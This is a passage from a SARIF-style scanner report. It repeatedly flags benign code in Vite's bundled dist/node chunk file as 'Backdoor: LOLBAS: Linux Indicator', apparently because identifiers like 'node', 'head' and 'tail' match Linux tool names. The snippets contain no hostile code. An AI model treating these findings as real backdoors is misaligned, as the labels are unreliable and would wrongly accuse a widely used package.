            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 26906,
                  "startColumn": 17,
                  "endLine": 26906,
                  "endColumn": 23,
                  "snippet": {
                    "text": "            value = value.toJSON();\n        }\n        if (!value || typeof value !== 'object') {\n            const node = new Scalar(value);\n            if (ref)\n                ref.node = node;\n            return node;\n",
                    "rendered": {
                      "text": "            value = value.toJSON();\n        }\n        if (!value || typeof value !== 'object') {\n            const node = new Scalar(value);\n            if (ref)\n                ref.node = node;\n            return node;\n",
                      "markdown": "`            value = value.toJSON();\n        }\n        if (!value || typeof value !== 'object') {\n            const node = new Scalar(value);\n            if (ref)\n                ref.node = node;\n            return node;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 26375,
                  "startColumn": 39,
                  "endLine": 26375,
                  "endColumn": 45,
                  "snippet": {
                    "text": "    }\n    else {\n        const pt = isAlias(parent) ? 'alias' : 'scalar';\n        throw new Error(`Cannot replace node with ${pt} parent`);\n    }\n}\n\n",
                    "rendered": {
                      "text": "    }\n    else {\n        const pt = isAlias(parent) ? 'alias' : 'scalar';\n        throw new Error(`Cannot replace node with ${pt} parent`);\n    }\n}\n\n",
                      "markdown": "`    }\n    else {\n        const pt = isAlias(parent) ? 'alias' : 'scalar';\n        throw new Error(`Cannot replace node with ${pt} parent`);\n    }\n}\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 26137,
                  "startColumn": 22,
                  "endLine": 26137,
                  "endColumn": 28,
                  "snippet": {
                    "text": "    return false;\n}\nfunction isNode$1(node) {\n    if (node && typeof node === 'object')\n        switch (node[NODE_TYPE]) {\n            case ALIAS:\n            case MAP:\n",
                    "rendered": {
                      "text": "    return false;\n}\nfunction isNode$1(node) {\n    if (node && typeof node === 'object')\n        switch (node[NODE_TYPE]) {\n            case ALIAS:\n            case MAP:\n",
                      "markdown": "`    return false;\n}\nfunction isNode$1(node) {\n    if (node && typeof node === 'object')\n        switch (node[NODE_TYPE]) {\n            case ALIAS:\n            case MAP:\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 26128,
                  "startColumn": 22,
                  "endLine": 26128,
                  "endColumn": 28,
                  "snippet": {
                    "text": "const isScalar$1 = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === SCALAR$1;\nconst isSeq = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === SEQ;\nfunction isCollection$1(node) {\n    if (node && typeof node === 'object')\n        switch (node[NODE_TYPE]) {\n            case MAP:\n            case SEQ:\n",
                    "rendered": {
                      "text": "const isScalar$1 = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === SCALAR$1;\nconst isSeq = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === SEQ;\nfunction isCollection$1(node) {\n    if (node && typeof node === 'object')\n        switch (node[NODE_TYPE]) {\n            case MAP:\n            case SEQ:\n",
                      "markdown": "`const isScalar$1 = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === SCALAR$1;\nconst isSeq = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === SEQ;\nfunction isCollection$1(node) {\n    if (node && typeof node === 'object')\n        switch (node[NODE_TYPE]) {\n            case MAP:\n            case SEQ:\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 26126,
                  "startColumn": 40,
                  "endLine": 26126,
                  "endColumn": 46,
                  "snippet": {
                    "text": "const isMap = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === MAP;\nconst isPair = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === PAIR;\nconst isScalar$1 = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === SCALAR$1;\nconst isSeq = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === SEQ;\nfunction isCollection$1(node) {\n    if (node && typeof node === 'object')\n        switch (node[NODE_TYPE]) {\n",
                    "rendered": {
                      "text": "const isMap = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === MAP;\nconst isPair = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === PAIR;\nconst isScalar$1 = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === SCALAR$1;\nconst isSeq = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === SEQ;\nfunction isCollection$1(node) {\n    if (node && typeof node === 'object')\n        switch (node[NODE_TYPE]) {\n",
                      "markdown": "`const isMap = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === MAP;\nconst isPair = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === PAIR;\nconst isScalar$1 = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === SCALAR$1;\nconst isSeq = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === SEQ;\nfunction isCollection$1(node) {\n    if (node && typeof node === 'object')\n        switch (node[NODE_TYPE]) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 26125,
                  "startColumn": 45,
                  "endLine": 26125,
                  "endColumn": 51,
                  "snippet": {
                    "text": "const isDocument = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === DOC;\nconst isMap = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === MAP;\nconst isPair = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === PAIR;\nconst isScalar$1 = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === SCALAR$1;\nconst isSeq = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === SEQ;\nfunction isCollection$1(node) {\n    if (node && typeof node === 'object')\n",
                    "rendered": {
                      "text": "const isDocument = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === DOC;\nconst isMap = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === MAP;\nconst isPair = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === PAIR;\nconst isScalar$1 = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === SCALAR$1;\nconst isSeq = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === SEQ;\nfunction isCollection$1(node) {\n    if (node && typeof node === 'object')\n",
                      "markdown": "`const isDocument = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === DOC;\nconst isMap = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === MAP;\nconst isPair = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === PAIR;\nconst isScalar$1 = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === SCALAR$1;\nconst isSeq = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === SEQ;\nfunction isCollection$1(node) {\n    if (node && typeof node === 'object')\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 26124,
                  "startColumn": 41,
                  "endLine": 26124,
                  "endColumn": 47,
                  "snippet": {
                    "text": "const isAlias = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === ALIAS;\nconst isDocument = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === DOC;\nconst isMap = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === MAP;\nconst isPair = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === PAIR;\nconst isScalar$1 = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === SCALAR$1;\nconst isSeq = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === SEQ;\nfunction isCollection$1(node) {\n",
                    "rendered": {
                      "text": "const isAlias = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === ALIAS;\nconst isDocument = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === DOC;\nconst isMap = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === MAP;\nconst isPair = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === PAIR;\nconst isScalar$1 = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === SCALAR$1;\nconst isSeq = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === SEQ;\nfunction isCollection$1(node) {\n",
                      "markdown": "`const isAlias = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === ALIAS;\nconst isDocument = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === DOC;\nconst isMap = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === MAP;\nconst isPair = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === PAIR;\nconst isScalar$1 = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === SCALAR$1;\nconst isSeq = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === SEQ;\nfunction isCollection$1(node) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 26123,
                  "startColumn": 40,
                  "endLine": 26123,
                  "endColumn": 46,
                  "snippet": {
                    "text": "const NODE_TYPE = Symbol.for('yaml.node.type');\nconst isAlias = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === ALIAS;\nconst isDocument = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === DOC;\nconst isMap = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === MAP;\nconst isPair = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === PAIR;\nconst isScalar$1 = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === SCALAR$1;\nconst isSeq = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === SEQ;\n",
                    "rendered": {
                      "text": "const NODE_TYPE = Symbol.for('yaml.node.type');\nconst isAlias = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === ALIAS;\nconst isDocument = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === DOC;\nconst isMap = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === MAP;\nconst isPair = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === PAIR;\nconst isScalar$1 = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === SCALAR$1;\nconst isSeq = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === SEQ;\n",
                      "markdown": "`const NODE_TYPE = Symbol.for('yaml.node.type');\nconst isAlias = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === ALIAS;\nconst isDocument = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === DOC;\nconst isMap = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === MAP;\nconst isPair = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === PAIR;\nconst isScalar$1 = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === SCALAR$1;\nconst isSeq = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === SEQ;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 26122,
                  "startColumn": 45,
                  "endLine": 26122,
                  "endColumn": 51,
                  "snippet": {
                    "text": "const SEQ = Symbol.for('yaml.seq');\nconst NODE_TYPE = Symbol.for('yaml.node.type');\nconst isAlias = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === ALIAS;\nconst isDocument = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === DOC;\nconst isMap = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === MAP;\nconst isPair = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === PAIR;\nconst isScalar$1 = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === SCALAR$1;\n",
                    "rendered": {
                      "text": "const SEQ = Symbol.for('yaml.seq');\nconst NODE_TYPE = Symbol.for('yaml.node.type');\nconst isAlias = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === ALIAS;\nconst isDocument = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === DOC;\nconst isMap = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === MAP;\nconst isPair = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === PAIR;\nconst isScalar$1 = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === SCALAR$1;\n",
                      "markdown": "`const SEQ = Symbol.for('yaml.seq');\nconst NODE_TYPE = Symbol.for('yaml.node.type');\nconst isAlias = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === ALIAS;\nconst isDocument = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === DOC;\nconst isMap = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === MAP;\nconst isPair = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === PAIR;\nconst isScalar$1 = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === SCALAR$1;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 26121,
                  "startColumn": 42,
                  "endLine": 26121,
                  "endColumn": 48,
                  "snippet": {
                    "text": "const SCALAR$1 = Symbol.for('yaml.scalar');\nconst SEQ = Symbol.for('yaml.seq');\nconst NODE_TYPE = Symbol.for('yaml.node.type');\nconst isAlias = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === ALIAS;\nconst isDocument = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === DOC;\nconst isMap = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === MAP;\nconst isPair = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === PAIR;\n",
                    "rendered": {
                      "text": "const SCALAR$1 = Symbol.for('yaml.scalar');\nconst SEQ = Symbol.for('yaml.seq');\nconst NODE_TYPE = Symbol.for('yaml.node.type');\nconst isAlias = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === ALIAS;\nconst isDocument = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === DOC;\nconst isMap = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === MAP;\nconst isPair = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === PAIR;\n",
                      "markdown": "`const SCALAR$1 = Symbol.for('yaml.scalar');\nconst SEQ = Symbol.for('yaml.seq');\nconst NODE_TYPE = Symbol.for('yaml.node.type');\nconst isAlias = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === ALIAS;\nconst isDocument = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === DOC;\nconst isMap = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === MAP;\nconst isPair = (node) => !!node && typeof node === 'object' && node[NODE_TYPE] === PAIR;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 24254,
                  "startColumn": 3,
                  "endLine": 24254,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\n  function release (obj) {\n    tail.next = obj;\n    tail = obj;\n  }\n\n  return {\n",
                    "rendered": {
                      "text": "\n  function release (obj) {\n    tail.next = obj;\n    tail = obj;\n  }\n\n  return {\n",
                      "markdown": "`\n  function release (obj) {\n    tail.next = obj;\n    tail = obj;\n  }\n\n  return {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 24244,
                  "startColumn": 5,
                  "endLine": 24244,
                  "endColumn": 11,
                  "snippet": {
                    "text": "      head = current.next;\n    } else {\n      head = new Constructor();\n      tail = head;\n    }\n\n    current.next = null;\n",
                    "rendered": {
                      "text": "      head = current.next;\n    } else {\n      head = new Constructor();\n      tail = head;\n    }\n\n    current.next = null;\n",
                      "markdown": "`      head = current.next;\n    } else {\n      head = new Constructor();\n      tail = head;\n    }\n\n    current.next = null;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 24243,
                  "startColumn": 5,
                  "endLine": 24243,
                  "endColumn": 11,
                  "snippet": {
                    "text": "    if (current.next) {\n      head = current.next;\n    } else {\n      head = new Constructor();\n      tail = head;\n    }\n\n",
                    "rendered": {
                      "text": "    if (current.next) {\n      head = current.next;\n    } else {\n      head = new Constructor();\n      tail = head;\n    }\n\n",
                      "markdown": "`    if (current.next) {\n      head = current.next;\n    } else {\n      head = new Constructor();\n      tail = head;\n    }\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 24241,
                  "startColumn": 5,
                  "endLine": 24241,
                  "endColumn": 11,
                  "snippet": {
                    "text": "    var current = head;\n\n    if (current.next) {\n      head = current.next;\n    } else {\n      head = new Constructor();\n      tail = head;\n",
                    "rendered": {
                      "text": "    var current = head;\n\n    if (current.next) {\n      head = current.next;\n    } else {\n      head = new Constructor();\n      tail = head;\n",
                      "markdown": "`    var current = head;\n\n    if (current.next) {\n      head = current.next;\n    } else {\n      head = new Constructor();\n      tail = head;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 24235,
                  "startColumn": 5,
                  "endLine": 24235,
                  "endColumn": 11,
                  "snippet": {
                    "text": "\nfunction reusify$1 (Constructor) {\n  var head = new Constructor();\n  var tail = head;\n\n  function get () {\n    var current = head;\n",
                    "rendered": {
                      "text": "\nfunction reusify$1 (Constructor) {\n  var head = new Constructor();\n  var tail = head;\n\n  function get () {\n    var current = head;\n",
                      "markdown": "`\nfunction reusify$1 (Constructor) {\n  var head = new Constructor();\n  var tail = head;\n\n  function get () {\n    var current = head;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 24234,
                  "startColumn": 5,
                  "endLine": 24234,
                  "endColumn": 11,
                  "snippet": {
                    "text": "var queue = {exports: {}};\n\nfunction reusify$1 (Constructor) {\n  var head = new Constructor();\n  var tail = head;\n\n  function get () {\n",
                    "rendered": {
                      "text": "var queue = {exports: {}};\n\nfunction reusify$1 (Constructor) {\n  var head = new Constructor();\n  var tail = head;\n\n  function get () {\n",
                      "markdown": "`var queue = {exports: {}};\n\nfunction reusify$1 (Constructor) {\n  var head = new Constructor();\n  var tail = head;\n\n  function get () {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 22322,
                  "startColumn": 14,
                  "endLine": 22322,
                  "endColumn": 20,
                  "snippet": {
                    "text": "   */\n\n  const advance = () => input[index++];\n  const push = node => {\n    if (node.type === 'text' && prev.type === 'dot') {\n      prev.type = 'text';\n    }\n",
                    "rendered": {
                      "text": "   */\n\n  const advance = () => input[index++];\n  const push = node => {\n    if (node.type === 'text' && prev.type === 'dot') {\n      prev.type = 'text';\n    }\n",
                      "markdown": "`   */\n\n  const advance = () => input[index++];\n  const push = node => {\n    if (node.type === 'text' && prev.type === 'dot') {\n      prev.type = 'text';\n    }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 21834,
                  "startColumn": 7,
                  "endLine": 21834,
                  "endColumn": 13,
                  "snippet": {
                    "text": "\nconst pad = (input, maxLength, toNumber) => {\n  if (maxLength > 0) {\n    let dash = input[0] === '-' ? '-' : '';\n    if (dash) input = input.slice(1);\n    input = (dash + input.padStart(dash ? maxLength - 1 : maxLength, '0'));\n  }\n",
                    "rendered": {
                      "text": "\nconst pad = (input, maxLength, toNumber) => {\n  if (maxLength > 0) {\n    let dash = input[0] === '-' ? '-' : '';\n    if (dash) input = input.slice(1);\n    input = (dash + input.padStart(dash ? maxLength - 1 : maxLength, '0'));\n  }\n",
                      "markdown": "`\nconst pad = (input, maxLength, toNumber) => {\n  if (maxLength > 0) {\n    let dash = input[0] === '-' ? '-' : '';\n    if (dash) input = input.slice(1);\n    input = (dash + input.padStart(dash ? maxLength - 1 : maxLength, '0'));\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 21765,
                  "startColumn": 5,
                  "endLine": 21765,
                  "endColumn": 11,
                  "snippet": {
                    "text": "    return value;\n  }\n\n  let diff = Math.abs(tok.maxLen - String(value).length);\n  let relax = options.relaxZeros !== false;\n\n  switch (diff) {\n",
                    "rendered": {
                      "text": "    return value;\n  }\n\n  let diff = Math.abs(tok.maxLen - String(value).length);\n  let relax = options.relaxZeros !== false;\n\n  switch (diff) {\n",
                      "markdown": "`    return value;\n  }\n\n  let diff = Math.abs(tok.maxLen - String(value).length);\n  let relax = options.relaxZeros !== false;\n\n  switch (diff) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 21415,
                  "startColumn": 24,
                  "endLine": 21415,
                  "endColumn": 30,
                  "snippet": {
                    "text": "\t * Returns true if a node is an open or close node\n\t */\n\n\texports.isOpenOrClose = node => {\n\t  if (node.type === 'open' || node.type === 'close') {\n\t    return true;\n\t  }\n",
                    "rendered": {
                      "text": "\t * Returns true if a node is an open or close node\n\t */\n\n\texports.isOpenOrClose = node => {\n\t  if (node.type === 'open' || node.type === 'close') {\n\t    return true;\n\t  }\n",
                      "markdown": "`\t * Returns true if a node is an open or close node\n\t */\n\n\texports.isOpenOrClose = node => {\n\t  if (node.type === 'open' || node.type === 'close') {\n\t    return true;\n\t  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 21384,
                  "startColumn": 23,
                  "endLine": 21384,
                  "endColumn": 29,
                  "snippet": {
